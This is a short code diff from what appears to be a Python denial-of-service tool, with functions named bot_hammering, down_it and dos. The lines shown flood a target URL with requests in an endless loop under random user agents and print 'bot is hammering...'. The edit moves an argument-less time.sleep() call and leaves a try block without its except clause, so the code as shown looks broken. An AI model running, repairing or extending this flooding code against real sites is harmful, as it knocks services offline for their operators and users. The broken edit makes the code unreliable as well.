@@ -23,8 +23,6 @@ def bot_hammering(url):
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
 			print("\033[94mbot is hammering...\033[0m")
-	except:
-		time.sleep()
 
 def down_it(item):
 	try:
@@ -41,6 +39,7 @@ def down_it(item):
 	except socket.error as e:
 		print("\033[91mno Bağlantı kurulamıyor! \033[0m")
 		print("\033[91m",e,"\033[0m")
+		time.sleep()
 
 
 def dos():
